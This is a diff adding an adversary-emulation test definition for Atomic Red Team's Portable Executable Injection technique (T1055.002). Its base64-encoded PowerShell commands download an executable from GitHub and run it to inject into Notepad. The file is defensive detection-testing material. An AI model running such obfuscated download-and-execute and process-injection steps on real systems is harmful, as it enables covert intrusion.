@@ -1,0 +1,22 @@
+- id: 7d13d184-fb8c-542b-8c63-e34c75e9d041
+  name: Soumaia ART Tests - Portable Executable Injection
+  description: This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title "Warning" and the content "Atomic Red Team" after a few seconds. (requires elevation)
+  tactic: stealth
+  technique:
+    attack_id: T1055.002
+    name: 'Process Injection: Portable Executable Injection'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFIAZQBkAEkAbgBqAGUAYwB0AGkAbwBuAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABSAGUAZABJAG4AagBlAGMAdABpAG8AbgAuAGUAeABlACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADUALgAwADAAMgAvAGIAaQBuAC8AUgBlAGQASQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAUgBlAGQASQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiAAoA
+          }
+          Start-Process ".\RedInjection.exe"
+          Start-Sleep -Seconds 7
+          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+        cleanup: |-
+          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+        payloads:
+        - RedInjection.exe
